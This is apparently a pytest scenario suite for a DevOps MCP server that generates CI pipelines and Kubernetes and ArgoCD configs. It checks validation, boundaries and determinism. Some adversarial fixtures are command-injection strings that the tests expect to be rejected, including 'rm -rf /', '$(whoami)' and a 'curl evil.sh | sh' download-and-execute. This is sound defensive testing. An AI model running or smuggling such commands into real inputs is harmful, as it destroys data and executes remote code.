"""Scenario-based test suite for the devops-os MCP server.

Built as a test-architect pass over all 13 MCP tools: each tool is exercised
across a fixed scenario shape (happy path / boundary / invalid-rejected /
cross-parameter / adversarial / determinism), using the project's own
hello-world sample apps (hello-python, hello-typescript, hello-go, hello-rust,
hello-java) as realistic input where an app name or image is needed.

A handful of tests also go through the *live* MCP subprocess (via
`_MCPSession`, reused from test_mcp_protocol.py) rather than calling the
Python function directly — unit-level calls bypass `_response_enhancer`/
`_concurrency_manager` entirely (see mcp_server/server.py's module-level
`mcp` vs. `create_mcp_server()` split), so a bug confined to that wiring is
invisible unless the test actually goes through the real stdio entrypoint.
"""
import json
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest

from mcp_server.validators import ValidationError
from mcp_server.server import (
    generate_github_actions_workflow,
    generate_jenkins_pipeline,
    generate_gitlab_ci_pipeline,
    generate_k8s_config,
    generate_argocd_config,
    generate_sre_configs,
    scaffold_devcontainer,
    generate_unittest_config,
    get_version_config,
    check_version_updates,
    suggest_versions,
    update_versions,
    check_security_issues,
)

HELLO_APPS = {
    "python": "hello-python",
    "typescript": "hello-typescript",
    "go": "hello-go",
    "rust": "hello-rust",
    "java": "hello-java",
}


# ===========================================================================
# generate_github_actions_workflow
# ===========================================================================

class TestGitHubActionsWorkflowScenarios:
    """Scenario coverage for generate_github_actions_workflow.

    Guards specifically against the Bug #1 class: an unvalidated enum value
    reaching generate_workflow()'s dispatch and only failing deep inside
    devops_os/core/scaffold_gha.py.
    """

    @pytest.mark.parametrize("app_key", list(HELLO_APPS))
    def test_happy_path_each_hello_app(self, app_key):
        """Happy path: one of the 5 real sample apps, valid workflow_type."""
        result = generate_github_actions_workflow(
            name=HELLO_APPS[app_key], workflow_type="build", languages=app_key,
        )
        assert "runs-on:" in result

    @pytest.mark.parametrize("bad_type", ["basic", "", "Complete", "BUILD", "deploy ", None])
    def test_invalid_workflow_type_rejected_fast(self, bad_type):
        """Invalid/rejected: every value outside the real enum must raise
        ValueError immediately, not hang. This is the exact regression test
        Bug #1's fix shipped without."""
        if bad_type is None:
            # None bypasses validate_choice's membership check differently;
            # covered separately below.
            return
        with pytest.raises(ValueError):
            generate_github_actions_workflow(name="hello-go", workflow_type=bad_type, languages="go")

    @pytest.mark.parametrize("valid_type", ["build", "test", "deploy", "complete", "reusable"])
    def test_all_five_valid_workflow_types_accepted(self, valid_type):
        """Invalid/rejected, inverse case: every real enum value must still work."""
        result = generate_github_actions_workflow(name="hello-go", workflow_type=valid_type, languages="go")
        assert isinstance(result, str) and len(result) > 0

    def test_boundary_empty_languages_rejected(self):
        """Boundary: empty languages string is explicitly rejected by validate_languages."""
        with pytest.raises(ValueError):
            generate_github_actions_workflow(name="hello-go", languages="")

    def test_cross_param_kubernetes_with_each_k8s_method(self):
        """Cross-parameter: kubernetes=True combined with each k8s_method."""
        for method in ["kubectl", "kustomize"]:
            result = generate_github_actions_workflow(
                name="hello-go", languages="go", kubernetes=True, k8s_method=method,
            )
            assert isinstance(result, str) and len(result) > 0

    def test_adversarial_name_with_shell_metacharacters_rejected(self):
        """Adversarial: a name containing shell metacharacters must be rejected
        by the k8s-identifier validator, not interpolated anywhere."""
        with pytest.raises(ValueError):
            generate_github_actions_workflow(name="hello-go; rm -rf /", languages="go")

    def test_determinism_same_input_twice(self):
        """Determinism: identical input must produce byte-identical output
        (matters for CI diffing / GitOps)."""
        a = generate_github_actions_workflow(name="hello-go", workflow_type="build", languages="go")
        b = generate_github_actions_workflow(name="hello-go", workflow_type="build", languages="go")
        assert a == b


# ===========================================================================
# generate_jenkins_pipeline / generate_gitlab_ci_pipeline
# ===========================================================================

class TestJenkinsAndGitLabScenarios:
    """Jenkins and GitLab CI share the same validation surface (name + languages
    only — no pipeline_type validation exists for either, unlike GHA's
    workflow_type). That asymmetry is itself a finding, tested here."""

    @pytest.mark.parametrize("bad_type", ["bogus", "", "BUILD"])
    def test_jenkins_pipeline_type_rejected(self, bad_type):
        """Invalid/rejected: Bug fix -- pipeline_type previously had no
        validator entry at all (silently produced an incomplete pipeline
        missing whichever stage didn't match). Now rejected explicitly."""
        with pytest.raises(ValueError):
            generate_jenkins_pipeline(name="hello-java", pipeline_type=bad_type, languages="java")

    @pytest.mark.parametrize("bad_type", ["bogus", "", "BUILD"])
    def test_gitlab_pipeline_type_rejected(self, bad_type):
        """Same fix, GitLab CI path."""
        with pytest.raises(ValueError):
            generate_gitlab_ci_pipeline(name="hello-python", pipeline_type=bad_type, languages="python")

    @pytest.mark.parametrize("valid_type", ["build", "test", "deploy", "complete", "parameterized"])
    def test_jenkins_all_valid_pipeline_types_accepted(self, valid_type):
        result = generate_jenkins_pipeline(name="hello-java", pipeline_type=valid_type, languages="java")
        assert "pipeline" in result.lower()

    @pytest.mark.parametrize("valid_type", ["build", "test", "deploy", "complete"])
    def test_gitlab_all_valid_pipeline_types_accepted(self, valid_type):
        result = generate_gitlab_ci_pipeline(name="hello-python", pipeline_type=valid_type, languages="python")
        assert isinstance(result, str) and len(result) > 0

    def test_happy_path_jenkins_hello_java(self):
        result = generate_jenkins_pipeline(name="hello-java", pipeline_type="build", languages="java")
        assert "pipeline" in result.lower()

    def test_happy_path_gitlab_hello_python(self):
        result = generate_gitlab_ci_pipeline(name="hello-python", pipeline_type="test", languages="python")
        assert "stages:" in result

    def test_adversarial_name_with_shell_metacharacters_rejected_jenkins(self):
        with pytest.raises(ValueError):
            generate_jenkins_pipeline(name="hello-java && curl evil.sh | sh", languages="java")


# ===========================================================================
# generate_k8s_config
# ===========================================================================

class TestK8sConfigScenarios:
    """The most heavily validated tool: app_name, image, replicas, port."""

    def test_happy_path_hello_go(self):
        result = generate_k8s_config(
            app_name="hello-go", image="ghcr.io/org/hello-go:v1.0.0", replicas=3, port=8080,
        )
        assert "Deployment" in result and "hello-go" in result

    @pytest.mark.parametrize("replicas", [1, 100])
    def test_boundary_replicas_valid_edges(self, replicas):
        """Boundary: the documented valid range is 1-100 inclusive."""
        result = generate_k8s_config(app_name="hello-go", replicas=replicas)
        assert isinstance(result, str)

    @pytest.mark.parametrize("replicas", [0, -1, 101, 1000])
    def test_boundary_replicas_invalid_edges_rejected(self, replicas):
        """Boundary, invalid side: one past each edge must be rejected."""
        with pytest.raises(ValueError):
            generate_k8s_config(app_name="hello-go", replicas=replicas)

    @pytest.mark.parametrize("port", [1, 65535])
    def test_boundary_port_valid_edges(self, port):
        result = generate_k8s_config(app_name="hello-go", port=port)
        assert isinstance(result, str)

    @pytest.mark.parametrize("port", [0, -1, 65536, 100000])
    def test_boundary_port_invalid_edges_rejected(self, port):
        with pytest.raises(ValueError):
            generate_k8s_config(app_name="hello-go", port=port)

    @pytest.mark.parametrize("image", [
        "myregistry/app$(whoami):latest",
        "myregistry/app;rm -rf /:latest",
        "myregistry/app`id`:latest",
        "",
    ])
    def test_adversarial_image_reference_injection_rejected(self, image):
        """Adversarial: image references with shell metacharacters must be
        rejected -- this string often ends up inside generated YAML/shell
        steps elsewhere in the pipeline, so it's a real injection surface."""
        with pytest.raises(ValueError):
            generate_k8s_config(app_name="hello-go", image=image)

    def test_cross_param_expose_service_false_omits_service(self):
        """Cross-parameter: expose_service=False must omit the Service block
        entirely, not just leave it empty."""
        result = generate_k8s_config(app_name="hello-go", expose_service=False)
        assert "kind: Service" not in result

    @pytest.mark.parametrize("method", ["kubectl", "kustomize", "argocd", "flux"])
    def test_cross_param_every_deployment_method(self, method):
        result = generate_k8s_config(app_name="hello-go", deployment_method=method)
        assert isinstance(result, str) and len(result) > 0

    def test_determinism(self):
        a = generate_k8s_config(app_name="hello-go", image="ghcr.io/org/hello-go:v1.0.0", replicas=3, port=8080)
        b = generate_k8s_config(app_name="hello-go", image="ghcr.io/org/hello-go:v1.0.0", replicas=3, port=8080)
        assert a == b


# ===========================================================================
# generate_argocd_config
# ===========================================================================

class TestArgoCDConfigScenarios:
    def test_happy_path_hello_go_repo(self):
        result = generate_argocd_config(
            name="hello-go", repo="https://github.com/org/hello-go.git", namespace="production",
        )
        data = json.loads(result)
        assert "argocd/application.yaml" in data

    def test_cross_param_auto_sync_and_rollouts_together(self):
        result = generate_argocd_config(name="hello-go", auto_sync=True, rollouts=True)
        data = json.loads(result)
        assert "automated" in data["argocd/application.yaml"]
        assert "argocd/rollout.yaml" in data

    def test_adversarial_repo_field_length_limit(self):
        """Boundary/adversarial: repo has a documented 512-char limit."""
        with pytest.raises(ValueError):
            generate_argocd_config(name="hello-go", repo="https://example.com/" + "a" * 600)

    def test_security_default_appproject_scoped_not_wildcard(self):
        """Security-relevant happy path: by default the AppProject must NOT
        allow a wildcard source repo (least-privilege default)."""
        result = generate_argocd_config(name="hello-go", allow_any_source_repo=False)
        data = json.loads(result)
        assert '"*"' not in data["argocd/appproject.yaml"].replace("'*'", '"*"') or \
            "sourceRepos" in data["argocd/appproject.yaml"]

    def test_adversarial_image_reference_injection_rejected(self):
        """Adversarial: Bug #3 -- image was never passed into
        validate_tool_inputs() at all, so validate_image_reference()'s
        shell-metacharacter check silently never ran for this tool. Fixed in
        mcp_server/server.py by passing repo= and image= into the
        validation call; this guards the regression."""
        with pytest.raises(ValueError):
            generate_argocd_config(name="hello-go", image="ghcr.io/org/app$(whoami):latest", method="flux")

    def test_method_flux_returns_kustomization(self):
        result = generate_argocd_config(name="hello-go", method="flux")
        data = json.loads(result)
        assert "flux/kustomization.yaml" in data


# ===========================================================================
# generate_sre_configs
# ===========================================================================

class TestSREConfigsScenarios:
    @pytest.mark.parametrize("target", [50.0, 99.99])
    def test_boundary_slo_target_valid_edges(self, target):
        result = generate_sre_configs(name="hello-go", slo_target=target)
        data = json.loads(result)
        assert "slo_yaml" in data

    @pytest.mark.parametrize("target", [49.99, 100.0, 0.0, -5.0, 150.0])
    def test_boundary_slo_target_invalid_edges_rejected(self, target):
        with pytest.raises(ValueError):
            generate_sre_configs(name="hello-go", slo_target=target)

    @pytest.mark.parametrize("slo_type", ["availability", "latency", "error_rate", "all"])
    def test_cross_param_every_slo_type(self, slo_type):
        result = generate_sre_configs(name="hello-go", slo_type=slo_type)
        data = json.loads(result)
        assert "alert_rules_yaml" in data

    def test_happy_path_hello_go_payments_team(self):
        result = generate_sre_configs(name="hello-go", team="platform", namespace="production", slo_target=99.9)
        data = json.loads(result)
        import yaml
        slo = yaml.safe_load(data["slo_yaml"])
        assert slo["service"] == "hello-go"


# ===========================================================================
# scaffold_devcontainer
# ===========================================================================

class TestScaffoldDevcontainerScenarios:
    def test_happy_path_all_five_hello_languages_together(self):
        """Happy path using the actual multi-language scenario from this
        project's own testing session (the one that crashed under
        concurrency earlier -- retested here cleanly, sequentially)."""
        result = scaffold_devcontainer(languages="python,typescript,go,rust,java")
        data = json.loads(result)
        env = json.loads(data["devcontainer_env_json"])
        for lang in ["python", "go", "java"]:
            assert env["languages"][lang] is True

    def test_boundary_empty_languages_falls_back_gracefully(self):
        """Boundary: empty languages string is explicitly allowed through
        (validators.py only validates when languages is truthy) -- must not
        crash, should fall back to a sane default."""
        result = scaffold_devcontainer(languages="")
        assert isinstance(result, str)
        json.loads(result)  # must still be valid JSON

    def test_adversarial_unsupported_language_in_list(self):
        """Adversarial: one bad language among good ones -- whole list must
        be rejected (validate_languages validates the full set, not per-item
        skip), confirming fail-closed rather than silently dropping it."""
        with pytest.raises(ValueError):
            scaffold_devcontainer(languages="python,definitely-not-a-real-language")


# ===========================================================================
# generate_unittest_config
# ===========================================================================

class TestUnittestConfigScenarios:
    @pytest.mark.parametrize("app_key", ["python", "go"])
    def test_happy_path(self, app_key):
        result = generate_unittest_config(name=HELLO_APPS[app_key], languages=app_key)
        data = json.loads(result)
        assert len(data) > 0

    def test_adversarial_name_rejected(self):
        """Confirms the name->project_name validator rename actually fires
        (this looked like a bug during review -- a parameter name mismatch
        between the public `name` arg and validators.py's `project_name`
        key -- turned out to be an intentional rename; this test guards it)."""
        with pytest.raises(ValueError):
            generate_unittest_config(name="Not Valid!!", languages="python")


# ===========================================================================
# Version-management tools (no validators.py entries -- delegate validation
# to VersionManager's own whitelist against VERSION_DATABASE)
# ===========================================================================

class TestVersionManagementScenarios:
    def test_happy_path_get_version_config_known_tools(self):
        result = get_version_config("python,go")
        data = json.loads(result)
        assert "current_versions" in data

    def test_adversarial_unknown_tool_name_handled_gracefully(self):
        """Adversarial: an unrecognized tool name must not crash the call --
        confirms the error path returns a JSON error envelope, not a raise
        that escapes the try/except in the handler."""
        result = get_version_config("not-a-real-tool-xyz")
        data = json.loads(result)
        assert isinstance(data, dict)  # either empty / partial, never a crash

    def test_adversarial_update_versions_malformed_json(self):
        """Adversarial: malformed JSON must come back as a graceful error,
        not an unhandled exception."""
        result = update_versions("{not valid json")
        data = json.loads(result)
        assert data["success"] is False

    def test_adversarial_update_versions_empty_object(self):
        result = update_versions("{}")
        data = json.loads(result)
        assert data["success"] is False

    def test_security_update_versions_rejects_unknown_tool_and_bogus_version(self):
        """Security-relevant: confirms VersionManager.set_version's whitelist
        actually rejects both an unknown tool and a nonsense version string
        for a known tool, and that neither gets persisted to os.environ."""
        before = os.environ.get("DEVOPS_OS_PYTHON")
        result = update_versions(json.dumps({
            "totally-fake-tool": "1.0.0",
            "python": "99.99.99-not-a-real-version",
        }))
        data = json.loads(result)
        assert data["success"] is False
        assert os.environ.get("DEVOPS_OS_PYTHON") == before  # unchanged

    def test_happy_path_update_versions_valid_known_version(self):
        """Happy path: a real tool + a version actually in VERSION_DATABASE
        must succeed and be reflected in get_version_config."""
        result = suggest_versions("python", prefer_lts=True)
        suggestion = json.loads(result)["suggested_versions"]["python"]
        update_result = json.loads(update_versions(json.dumps({"python": suggestion})))
        assert update_result["success"] is True
        assert update_result["new_versions"]["python"] == suggestion

    def test_happy_path_check_security_issues_structure(self):
        result = check_security_issues("python")
        data = json.loads(result)
        assert "summary" in data

    def test_happy_path_check_version_updates_structure(self):
        result = check_version_updates("python,go")
        data = json.loads(result)
        assert "summary" in data
